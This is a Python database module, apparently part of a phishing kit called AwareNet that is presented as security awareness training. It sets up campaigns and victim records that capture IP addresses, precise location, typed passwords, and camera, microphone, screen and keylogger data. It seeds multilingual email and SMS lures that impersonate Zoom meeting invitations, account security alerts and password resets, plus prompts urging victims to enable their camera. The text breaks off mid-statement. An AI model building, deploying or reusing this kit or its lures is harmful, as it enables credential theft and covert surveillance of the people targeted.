import sqlite3, os, json, threading, re
from datetime import datetime

def _get_resources_dir():
    import sys
    if getattr(sys, 'frozen', False):
        base = os.path.dirname(os.path.abspath(sys.executable))
    else:
        base = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "app.py")) else "."
    res = os.path.join(base, "awarenet ressources")
    try:
        os.makedirs(res, exist_ok=True)
    except Exception:
        pass
    return res

RESOURCES_DIR = _get_resources_dir()
DB_PATH = os.path.join(RESOURCES_DIR, "awarenet.db")
_local = threading.local()

def get_db():
    # Assure que le dossier ressources existe (pour .exe)
    try:
        os.makedirs(RESOURCES_DIR, exist_ok=True)
    except Exception:
        pass
    if not hasattr(_local, "conn") or _local.conn is None:
        _local.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        _local.conn.row_factory = sqlite3.Row
        _local.conn.execute("PRAGMA journal_mode=WAL")
        _local.conn.execute("PRAGMA foreign_keys=ON")
    return _local.conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS webhook_config (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT NOT NULL,
            url TEXT NOT NULL,
            enabled INTEGER DEFAULT 1,
            events TEXT DEFAULT '["capture"]'
        );

        CREATE TABLE IF NOT EXISTS banned_ips (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT UNIQUE NOT NULL,
            reason TEXT DEFAULT '',
            banned_at TEXT NOT NULL,
            attempts INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL DEFAULT '',
            template TEXT NOT NULL DEFAULT 'zoom',
            status TEXT NOT NULL DEFAULT 'active',
            note TEXT DEFAULT '',
            puburl TEXT DEFAULT '',
            screen_recording INTEGER DEFAULT 0,
            precise_location INTEGER DEFAULT 1,
            redirect_after_capture INTEGER DEFAULT 0,
            redirect_url TEXT DEFAULT '',
            lang TEXT DEFAULT 'en',
            show_pretext INTEGER DEFAULT 0,
            permissions TEXT DEFAULT '["camera","microphone","location","screen","keylogger"]',
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL,
            hits INTEGER DEFAULT 0,
            captures INTEGER DEFAULT 0,
            time_to_click_sum REAL DEFAULT 0,
            time_to_click_count INTEGER DEFAULT 0,
            submission_count INTEGER DEFAULT 0,
            audio_enabled INTEGER DEFAULT 0,
            audio_files TEXT DEFAULT '[]',
            audio_save INTEGER DEFAULT 0,
            video_enabled INTEGER DEFAULT 0,
            video_file TEXT DEFAULT '',
            video_repeat INTEGER DEFAULT 0,
            video_save INTEGER DEFAULT 0,
            active_seconds INTEGER DEFAULT 0,
            last_active_start TEXT DEFAULT '',
            paused_at TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS targets (
            id TEXT PRIMARY KEY,
            sid TEXT DEFAULT '',
            alias TEXT NOT NULL,
            ip TEXT DEFAULT '',
            user_agent TEXT DEFAULT '',
            template TEXT DEFAULT '',
            slug TEXT DEFAULT '',
            campaign TEXT DEFAULT '',
            status TEXT DEFAULT 'waiting',
            connected_at TEXT NOT NULL,
            lat REAL,
            lng REAL,
            captures INTEGER DEFAULT 0,
            last_seen TEXT,
            first_click_at TEXT,
            is_bot INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            time TEXT NOT NULL,
            kind TEXT NOT NULL DEFAULT '',
            detail TEXT NOT NULL DEFAULT '',
            campaign TEXT DEFAULT '',
            target_id TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id TEXT DEFAULT '',
            slug TEXT DEFAULT '',
            type TEXT NOT NULL DEFAULT 'photo',
            file_path TEXT DEFAULT '',
            metadata TEXT DEFAULT '{}',
            password_text TEXT DEFAULT '',
            password_strength TEXT DEFAULT '',
            created_at TEXT NOT NULL
        );

        CREATE TABLE IF NOT EXISTS email_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            subject TEXT NOT NULL,
            body TEXT NOT NULL,
            lang TEXT DEFAULT 'en'
        );

        CREATE TABLE IF NOT EXISTS translations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            lang TEXT NOT NULL,
            key TEXT NOT NULL,
            value TEXT NOT NULL,
            UNIQUE(lang, key)
        );

        CREATE TABLE IF NOT EXISTS smtp_config (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            host TEXT DEFAULT '',
            port INTEGER DEFAULT 587,
            username TEXT DEFAULT '',
            password TEXT DEFAULT '',
            use_tls INTEGER DEFAULT 1,
            sender_name TEXT DEFAULT 'AwareNet',
            sender_email TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS campaign_emails (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_slug TEXT NOT NULL,
            recipient TEXT NOT NULL,
            subject TEXT NOT NULL,
            sent_at TEXT NOT NULL,
            status TEXT DEFAULT 'sent'
        );

        CREATE TABLE IF NOT EXISTS sms_templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            body TEXT NOT NULL,
            lang TEXT DEFAULT 'en'
        );

        CREATE TABLE IF NOT EXISTS sms_config (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            provider TEXT DEFAULT 'twilio',
            account_sid TEXT DEFAULT '',
            auth_token TEXT DEFAULT '',
            from_number TEXT DEFAULT '',
            api_key TEXT DEFAULT '',
            sender_id TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS campaign_sms (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_slug TEXT NOT NULL,
            recipient TEXT NOT NULL,
            body TEXT NOT NULL,
            sent_at TEXT NOT NULL,
            status TEXT DEFAULT 'sent'
        );

        CREATE TABLE IF NOT EXISTS global_defaults (
            key TEXT PRIMARY KEY,
            value TEXT DEFAULT ''
        );

        CREATE TABLE IF NOT EXISTS panel_access_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT NOT NULL,
            user_agent TEXT DEFAULT '',
            path TEXT DEFAULT '',
            success INTEGER DEFAULT 0,
            accessed_at TEXT NOT NULL
        );
    """)
    conn.commit()
    seed_default_translations()
    seed_default_email_templates()
    seed_default_sms_templates()
    migrate_schema()

def migrate_schema():
    conn = get_db()
    try:
        conn.execute("SELECT permissions FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN permissions TEXT DEFAULT '[\"camera\",\"microphone\",\"location\",\"screen\",\"keylogger\"]'")
        conn.commit()
    try:
        conn.execute("SELECT chat_mode FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN chat_mode INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT photo_quality FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN photo_quality TEXT DEFAULT '480'")
        conn.commit()
    try:
        conn.execute("SELECT video_quality FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN video_quality TEXT DEFAULT '480'")
        conn.commit()
    try:
        conn.execute("SELECT liveview_quality FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN liveview_quality TEXT DEFAULT 'low'")
        conn.commit()
    try:
        conn.execute("SELECT auto_delete FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN auto_delete INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT auto_delete_seconds FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN auto_delete_seconds INTEGER DEFAULT 3600")
        conn.commit()
    try:
        conn.execute("SELECT auto_start FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN auto_start INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT auto_start_delay FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN auto_start_delay INTEGER DEFAULT 3600")
        conn.commit()
    try:
        conn.execute("SELECT training_mode FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN training_mode INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT 1 FROM panel_access_log LIMIT 1")
    except Exception:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS panel_access_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                user_agent TEXT DEFAULT '',
                path TEXT DEFAULT '',
                success INTEGER DEFAULT 0,
                accessed_at TEXT NOT NULL
            );
        """)
        conn.commit()
    try:
        conn.execute("SELECT notes FROM targets LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE targets ADD COLUMN notes TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT download_in_page FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN download_in_page INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT download_file_name FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN download_file_name TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT download_display_name FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN download_display_name TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT audio_enabled FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN audio_enabled INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT audio_files FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN audio_files TEXT DEFAULT '[]'")
        conn.commit()
    try:
        conn.execute("SELECT audio_save FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN audio_save INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT video_enabled FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN video_enabled INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT video_file FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN video_file TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT video_repeat FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN video_repeat INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT video_save FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN video_save INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT active_seconds FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN active_seconds INTEGER DEFAULT 0")
        conn.commit()
    try:
        conn.execute("SELECT last_active_start FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN last_active_start TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT paused_at FROM campaigns LIMIT 1")
    except Exception:
        conn.execute("ALTER TABLE campaigns ADD COLUMN paused_at TEXT DEFAULT ''")
        conn.commit()
    try:
        conn.execute("SELECT 1 FROM sms_templates LIMIT 1")
    except Exception:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS sms_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                body TEXT NOT NULL,
                lang TEXT DEFAULT 'en'
            );
            CREATE TABLE IF NOT EXISTS sms_config (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                provider TEXT DEFAULT 'twilio',
                account_sid TEXT DEFAULT '',
                auth_token TEXT DEFAULT '',
                from_number TEXT DEFAULT '',
                api_key TEXT DEFAULT '',
                sender_id TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS campaign_sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_slug TEXT NOT NULL,
                recipient TEXT NOT NULL,
                body TEXT NOT NULL,
                sent_at TEXT NOT NULL,
                status TEXT DEFAULT 'sent'
            );
            CREATE TABLE IF NOT EXISTS global_defaults (
                key TEXT PRIMARY KEY,
                value TEXT DEFAULT ''
            );
        """)
        conn.commit()
        seed_default_sms_templates()

def seed_default_translations():
    conn = get_db()
    existing = conn.execute("SELECT COUNT(*) FROM translations").fetchone()[0]
    if existing > 0:
        return
    defaults = {
        "en": {
            "site.title": "Security Awareness Lab",
            "site.tagline": "Educational phishing simulation",
            "perm.title": "Camera Access Required",
            "perm.desc": "You need to enable camera to continue",
            "perm.btn": "Enable Camera",
            "connecting": "Connecting...",
            "redirect.notice": "You are being redirected...",
            "training.title": "Great Catch!",
            "training.desc": "You identified a phishing attempt. Learn how to stay safe.",
            "training.btn": "Take Training",
        },
        "fr": {
            "site.title": "Laboratoire de Sensibilisation",
            "site.tagline": "Simulation de phishing éducative",
            "perm.title": "Accès à la caméra requis",
            "perm.desc": "Vous devez activer la caméra pour continuer",
            "perm.btn": "Activer la Caméra",
            "connecting": "Connexion...",
            "redirect.notice": "Vous allez être redirigé...",
            "training.title": "Bien vu !",
            "training.desc": "Vous avez identifié une tentative de phishing. Apprenez à rester en sécurité.",
            "training.btn": "Suivre la Formation",
        },
        "es": {
            "site.title": "Laboratorio de Concientización",
            "site.tagline": "Simulación educativa de phishing",
            "perm.title": "Acceso a la cámara requerido",
            "perm.desc": "Debe habilitar la cámara para continuar",
            "perm.btn": "Habilitar Cámara",
            "connecting": "Conectando...",
            "redirect.notice": "Está siendo redirigido...",
            "training.title": "¡Bien Hecho!",
            "training.desc": "Ha identificado un intento de phishing. Aprenda a mantenerse seguro.",
            "training.btn": "Tomar Capacitación",
        },
        "de": {
            "site.title": "Sicherheitsbewusstseins-Labor",
            "site.tagline": "Pädagogische Phishing-Simulation",
            "perm.title": "Kamerazugriff erforderlich",
            "perm.desc": "Sie müssen die Kamera aktivieren, um fortzufahren",
            "perm.btn": "Kamera aktivieren",
            "connecting": "Verbinde...",
            "redirect.notice": "Sie werden weitergeleitet...",
            "training.title": "Gut erkannt!",
            "training.desc": "Sie haben einen Phishing-Versuch erkannt. Erfahren Sie, wie Sie sicher bleiben.",
            "training.btn": "Schulung starten",
        },
        "pt": {
            "site.title": "Laboratório de Conscientização",
            "site.tagline": "Simulação educacional de phishing",
            "perm.title": "Acesso à câmera necessário",
            "perm.desc": "Você precisa ativar a câmera para continuar",
            "perm.btn": "Ativar Câmera",
            "connecting": "Conectando...",
            "redirect.notice": "Você está sendo redirecionado...",
            "training.title": "Bom trabalho!",
            "training.desc": "Você identificou uma tentativa de phishing. Aprenda a se manter seguro.",
            "training.btn": "Fazer Treinamento",
        },
        "ar": {
            "site.title": "مختبر التوعية الأمنية",
            "site.tagline": "محاكاة تصيد تعليمية",
            "perm.title": "مطلوب إذن الكاميرا",
            "perm.desc": "تحتاج إلى تمكين الكاميرا للمتابعة",
            "perm.btn": "تمكين الكاميرا",
            "connecting": "جاري الاتصال...",
            "redirect.notice": "جاري إعادة توجيهك...",
            "training.title": "أحسنت!",
            "training.desc": "لقد حددت محاولة تصيد. تعلم كيف تبقى آمنًا.",
            "training.btn": "ابدأ التدريب",
        },
        "it": {
            "site.title": "Laboratorio di Sensibilizzazione",
            "site.tagline": "Simulazione educativa di phishing",
            "perm.title": "Accesso alla fotocamera richiesto",
            "perm.desc": "È necessario abilitare la fotocamera per continuare",
            "perm.btn": "Abilita Fotocamera",
            "connecting": "Connessione...",
            "redirect.notice": "Stai per essere reindirizzato...",
            "training.title": "Bene!",
            "training.desc": "Hai identificato un tentativo di phishing. Impara come rimanere al sicuro.",
            "training.btn": "Segui la Formazione",
        },
        "nl": {
            "site.title": "Security Awareness Lab",
            "site.tagline": "Educatieve phishing-simulatie",
            "perm.title": "Cameratoegang vereist",
            "perm.desc": "U moet de camera inschakelen om door te gaan",
            "perm.btn": "Camera Insakelen",
            "connecting": "Verbinden...",
            "redirect.notice": "U wordt doorgestuurd...",
            "training.title": "Goed gevangen!",
            "training.desc": "U heeft een phishingpoging herkend. Leer hoe u veilig blijft.",
            "training.btn": "Volg Training",
        },
        "pl": {
            "site.title": "Laboratorium Świadomości Bezpieczeństwa",
            "site.tagline": "Edukacyjna symulacja phishingu",
            "perm.title": "Wymagany dostęp do kamery",
            "perm.desc": "Musisz włączyć kamerę, aby kontynuować",
            "perm.btn": "Włącz Kamerę",
            "connecting": "Łączenie...",
            "redirect.notice": "Zostaniesz przekierowany...",
            "training.title": "Dobra robota!",
            "training.desc": "Zidentyfikowałeś próbę phishingu. Dowiedz się, jak zachować bezpieczeństwo.",
            "training.btn": "Rozpocznij Szkolenie",
        },
        "ru": {
            "site.title": "Лаборатория информационной безопасности",
            "site.tagline": "Образовательная симуляция фишинга",
            "perm.title": "Требуется доступ к камере",
            "perm.desc": "Вам нужно включить камеру, чтобы продолжить",
            "perm.btn": "Включить камеру",
            "connecting": "Подключение...",
            "redirect.notice": "Вы будете перенаправлены...",
            "training.title": "Отлично!",
            "training.desc": "Вы обнаружили попытку фишинга. Узнайте, как оставаться в безопасности.",
            "training.btn": "Пройти обучение",
        },
        "ja": {
            "site.title": "セキュリティ意識向上ラボ",
            "site.tagline": "教育用フィッシングシミュレーション",
            "perm.title": "カメラアクセスが必要です",
            "perm.desc": "続行するにはカメラを有効にする必要があります",
            "perm.btn": "カメラを有効にする",
            "connecting": "接続中...",
            "redirect.notice": "リダイレクトされています...",
            "training.title": "よくできました！",
            "training.desc": "フィッシングの試みを特定しました。安全を保つ方法を学びましょう。",
            "training.btn": "トレーニングを受ける",
        },
        "ko": {
            "site.title": "보안 인식 연구소",
            "site.tagline": "교육용 피싱 시뮬레이션",
            "perm.title": "카메라 액세스 필요",
            "perm.desc": "계속하려면 카메라를 활성화해야 합니다",
            "perm.btn": "카메라 활성화",
            "connecting": "연결 중...",
            "redirect.notice": "리디렉션 중...",
            "training.title": "잘하셨습니다!",
            "training.desc": "피싱 시도를 식별했습니다. 안전을 유지하는 방법을 알아보세요.",
            "training.btn": "교육 받기",
        },
        "zh-CN": {
            "site.title": "安全意识实验室",
            "site.tagline": "教育性网络钓鱼模拟",
            "perm.title": "需要摄像头访问权限",
            "perm.desc": "您需要启用摄像头才能继续",
            "perm.btn": "启用摄像头",
            "connecting": "连接中...",
            "redirect.notice": "正在重定向...",
            "training.title": "做得好！",
            "training.desc": "您识别出了一次网络钓鱼尝试。了解如何保持安全。",
            "training.btn": "参加培训",
        },
        "zh-TW": {
            "site.title": "安全意識實驗室",
            "site.tagline": "教育性釣魚模擬",
            "perm.title": "需要相機存取權限",
            "perm.desc": "您需要啟用相機才能繼續",
            "perm.btn": "啟用相機",
            "connecting": "連線中...",
            "redirect.notice": "正在重新導向...",
            "training.title": "做得好！",
            "training.desc": "您識別出了一次釣魚嘗試。了解如何保持安全。",
            "training.btn": "參加培訓",
        },
        "tr": {
            "site.title": "Güvenlik Farkındalık Laboratuvarı",
            "site.tagline": "Eğitici kimlik avı simülasyonu",
            "perm.title": "Kamera Erişimi Gerekli",
            "perm.desc": "Devam etmek için kamerayı etkinleştirmeniz gerekiyor",
            "perm.btn": "Kamerayı Etkinleştir",
            "connecting": "Bağlanıyor...",
            "redirect.notice": "Yönlendiriliyorsunuz...",
            "training.title": "İyi yakaladınız!",
            "training.desc": "Bir kimlik avı girişimi tespit ettiniz. Güvende kalmayı öğrenin.",
            "training.btn": "Eğitimi Al",
        },
        "vi": {
            "site.title": "Phòng Thí Nghiệm Nhận Thức Bảo Mật",
            "site.tagline": "Mô phỏng lừa đảo giáo dục",
            "perm.title": "Yêu cầu quyền truy cập camera",
            "perm.desc": "Bạn cần bật camera để tiếp tục",
            "perm.btn": "Bật Camera",
            "connecting": "Đang kết nối...",
            "redirect.notice": "Bạn đang được chuyển hướng...",
            "training.title": "Tuyệt vời!",
            "training.desc": "Bạn đã phát hiện một nỗ lực lừa đảo. Tìm hiểu cách giữ an toàn.",
            "training.btn": "Tham gia Đào tạo",
        },
        "th": {
            "site.title": "ห้องปฏิบัติการความตระหนักด้านความปลอดภัย",
            "site.tagline": "การจำลองฟิชชิ่งเพื่อการศึกษา",
            "perm.title": "จำเป็นต้องเข้าถึงกล้อง",
            "perm.desc": "คุณต้องเปิดใช้งานกล้องเพื่อดำเนินการต่อ",
            "perm.btn": "เปิดใช้งานกล้อง",
            "connecting": "กำลังเชื่อมต่อ...",
            "redirect.notice": "คุณกำลังถูกเปลี่ยนเส้นทาง...",
            "training.title": "เยี่ยมมาก!",
            "training.desc": "คุณระบุความพยายามฟิชชิ่งได้ เรียนรู้วิธีอยู่อย่างปลอดภัย",
            "training.btn": "รับการฝึกอบรม",
        },
        "id": {
            "site.title": "Laboratorium Kesadaran Keamanan",
            "site.tagline": "Simulasi phishing edukatif",
            "perm.title": "Akses Kamera Diperlukan",
            "perm.desc": "Anda perlu mengaktifkan kamera untuk melanjutkan",
            "perm.btn": "Aktifkan Kamera",
            "connecting": "Menghubungkan...",
            "redirect.notice": "Anda sedang dialihkan...",
            "training.title": "Tangkapan bagus!",
            "training.desc": "Anda mengidentifikasi upaya phishing. Pelajari cara tetap aman.",
            "training.btn": "Ikuti Pelatihan",
        },
        "sv": {
            "site.title": "Säkerhetsmedvetenhetslaboratorium",
            "site.tagline": "Utbildande nätfiskesimulering",
            "perm.title": "Kameratillgång krävs",
            "perm.desc": "Du måste aktivera kameran för att fortsätta",
            "perm.btn": "Aktivera Kamera",
            "connecting": "Ansluter...",
            "redirect.notice": "Du omdirigeras...",
            "training.title": "Bra fångat!",
            "training.desc": "Du identifierade ett nätfiskeförsök. Lär dig hur du håller dig säker.",
            "training.btn": "Genomgå Utbildning",
        },
    }
    for lang, keys in defaults.items():
        for key, value in keys.items():
            try:
                conn.execute("INSERT OR IGNORE INTO translations (lang, key, value) VALUES (?, ?, ?)",
                             (lang, key, value))
            except Exception:
                pass
    conn.commit()

def seed_default_email_templates():
    conn = get_db()
    existing = conn.execute("SELECT COUNT(*) FROM email_templates").fetchone()[0]
    if existing > 0:
        return
    templates = [
        {
            "name": "Zoom Meeting Invitation",
            "subject": "You are invited to join a Zoom meeting",
            "body": """Hi {{ name }},

You are invited to join a Zoom meeting scheduled by your organization.

Topic: {{ topic | default('Security Verification') }}
Time: {{ time | default('This is an instant meeting') }}

Click the link below to join:
{{ link }}

Thank you,
Zoom Video Communications""",
            "lang": "en"
        },
        {
            "name": "Account Security Alert",
            "subject": "Unusual sign-in attempt detected",
            "body": """Dear {{ name }},

We noticed an unusual sign-in attempt to your account from a new device.

If this was you, please verify your identity:
{{ link }}

If this wasn't you, someone may have your password.

Security Team""",
            "lang": "en"
        },
        {
            "name": "Password Reset Request",
            "subject": "Reset your password",
            "body": """Hi {{ name }},

We received a request to reset your password.

Click the link below to reset it:
{{ link }}

This link will expire in 24 hours.

If you didn't request this, please ignore this email.

- The Team""",
            "lang": "en"
        },
        {
            "name": "Invitation à une réunion Zoom",
            "subject": "Vous êtes invité à rejoindre une réunion Zoom",
            "body": """Bonjour {{ name }},

Vous êtes invité à rejoindre une réunion Zoom organisée par votre organisation.

Sujet : {{ topic | default('Vérification de sécurité') }}
Date : {{ time | default('Réunion instantanée') }}

Cliquez sur le lien ci-dessous pour rejoindre :
{{ link }}

Merci,
Zoom Video Communications""",
            "lang": "fr"
        },
        {
            "name": "Alerte de sécurité de compte",
            "subject": "Tentative de connexion inhabituelle détectée",
            "body": """Cher {{ name }},

Nous avons détecté une tentative de connexion inhabituelle à votre compte depuis un nouvel appareil.

Si c'était vous, veuillez vérifier votre identité :
{{ link }}

Si ce n'était pas vous, quelqu'un pourrait avoir votre mot de passe.

L'équipe de sécurité""",
            "lang": "fr"
        },
        {
            "name": "Invitación a reunión de Zoom",
            "subject": "Está invitado a una reunión de Zoom",
            "body": """Hola {{ name }},

Está invitado a una reunión de Zoom programada por su organización.

Tema: {{ topic | default('Verificación de seguridad') }}
Hora: {{ time | default('Esta es una reunión instantánea') }}

Haga clic en el enlace para unirse:
{{ link }}

Gracias,
Zoom Video Communications""",
            "lang": "es"
        },
    ]
    for t in templates:
        conn.execute(
            "INSERT INTO email_templates (name, subject, body, lang) VALUES (?, ?, ?, ?)",
            (t["name"], t["subject"], t["body"], t["lang"])
        )
    conn.commit()

def seed_default_sms_templates():
    conn = get_db()
    existing = conn.execute("SELECT COUNT(*) FROM sms_templates").fetchone()[0]
    if existing > 0:
        return
    templates = [
        {
            "name": "Zoom Meeting Invitation",
            "body": "Hi {{ name }}, you are invited to join a Zoom meeting: {{ link }} Topic: {{ topic }}",
            "lang": "en"
        },
        {
            "name": "Security Alert",
            "body": "Dear {{ name }}, unusual sign-in detected. Verify: {{ link }}",
            "lang": "en"
        },
        {
            "name": "Password Reset",
            "body": "Hi {{ name }}, reset your password: {{ link }} Expires in 24h.",
            "lang": "en"
        },
        {
            "name": "Invitation Zoom",
            "body": "Bonjour {{ name }}, vous etes invite a rejoindre une reunion Zoom: {{ link }}",
            "lang": "fr"
        },
        {
            "name": "Alerte Securite",
            "body": "Cher {{ name }}, tentative de connexion inhabituelle detectee: {{ link }}",
            "lang": "fr"
        },
        {
            "name": "Invitacion Zoom",
            "body": "Hola {{ name }}, estas invitado a una reunion Zoom: {{ link }}",
            "lang": "es"
        },
        {
            "name": "Zoom Einladung",
            "body": "Hallo {{ name }}, Sie sind zu einem Zoom-Meeting eingeladen: {{ link }}",
            "lang": "de"
        },
        {
            "name": "Convite Zoom",
            "body": "Ola {{ name }}, voce esta convidado para reuniao Zoom: {{ link }}",
            "lang": "pt"
        },
        {
            "name": "Invito Zoom",
            "body": "Ciao {{ name }}, sei invitato a una riunione Zoom: {{ link }}",
            "lang": "it"
        },
        {
            "name": "Zoom Uitnodiging",
            "body": "Hallo {{ name }}, u bent uitgenodigd voor een Zoom-vergadering: {{ link }}",
            "lang": "nl"
        },
    ]
    for t in templates:
        conn.execute(
            "INSERT INTO sms_templates (name, body, lang) VALUES (?, ?, ?)",
            (t["name"], t["body"], t["lang"])
        )
    conn.commit()

def get_global_default(key, default=""):
    conn = get_db()
    row = conn.execute("SELECT value FROM global_defaults WHERE key=?", (key,)).fetchone()
    return row["value"] if row else default

def set_global_default(key, value):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO global_defaults (key, value) VALUES (?, ?)", (key, value))
    conn.commit()

def get_all_global_defaults():
    conn = get_db()
    rows = conn.execute("SELECT * FROM global_defaults").fetchall()
    return {r["key"]: r["value"] for r in rows}

def update_campaign_active_timer(slug, old_status, new_status):
    conn = get_db()
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c = conn.execute("SELECT * FROM campaigns WHERE slug=?", (slug,)).fetchone()
    if not c:
        return
    c = dict(c)
    active_seconds = c.get("active_seconds", 0) or 0
    last_start = c.get("last_active_start", "")
    # If pausing/stopping, accumulate active time
    if old_status == "active" and new_status in ("paused", "stopped", "waiting"):
        if last_start:
            try:
                start_dt = datetime.strptime(last_start, "%Y-%m-%d %H:%M:%S")
                delta = (datetime.now() - start_dt).total_seconds()
                active_seconds += int(delta)
                conn.execute("UPDATE campaigns SET active_seconds=?, last_active_start='', paused_at=? WHERE slug=?", (active_seconds, now_str, slug))
                conn.commit()
                return
            except Exception:
                pass
        conn.execute("UPDATE campaigns SET paused_at=? WHERE slug=?", (now_str, slug))
        conn.commit()
    elif old_status in ("paused", "stopped", "waiting") and new_status == "active":
        conn.execute("UPDATE campaigns SET last_active_start=?, paused_at='' WHERE slug=?", (now_str, slug))
        conn.commit()
    elif new_status == "active" and not last_start:
        conn.execute("UPDATE campaigns SET last_active_start=? WHERE slug=?", (now_str, slug))
        conn.commit()

def get_campaign_active_seconds(slug):
    conn = get_db()
    row = conn.execute("SELECT active_seconds, last_active_start, status FROM campaigns WHERE slug=?", (slug,)).fetchone()
    if not row:
        return 0
    active = row["active_seconds"] or 0
    if row["status"] == "active" and row["last_active_start"]:
        try:
            start_dt = datetime.strptime(row["last_active_start"], "%Y-%m-%d %H:%M:%S")
            delta = (datetime.now() - start_dt).total_seconds()
            active += int(delta)
        except Exception:
            pass
    return active

def t(lang, key, default=""):
    conn = get_db()
    row = conn.execute("SELECT value FROM translations WHERE lang=? AND key=?", (lang, key)).fetchone()
    if row:
        return row["value"]
    row = conn.execute("SELECT value FROM translations WHERE lang='en' AND key=?", (key,)).fetchone()
    return row["value"] if row else default

def get_or_create_campaign(slug, data=None):
    conn = get_db()
    row = conn.execute("SELECT * FROM campaigns WHERE slug=?", (slug,)).fetchone()
    if row:
        return dict(row)
    if data:
        now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
        now_iso = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        status = data.get("status", "active")
        last_active_start = now_iso if status == "active" else ""
        audio_files_json = json.dumps(data.get("audio_files", []))
        conn.execute("""INSERT INTO campaigns
            (slug, name, template, status, note, puburl, screen_recording,
             precise_location, redirect_after_capture, redirect_url, lang,
             show_pretext, permissions, created_at, updated_at, hits, captures, chat_mode,
             photo_quality, video_quality, liveview_quality,
             auto_delete, auto_delete_seconds,
             auto_start, auto_start_delay, training_mode,
             download_in_page, download_file_name, download_display_name,
             audio_enabled, audio_files, audio_save,
             video_enabled, video_file, video_repeat, video_save,
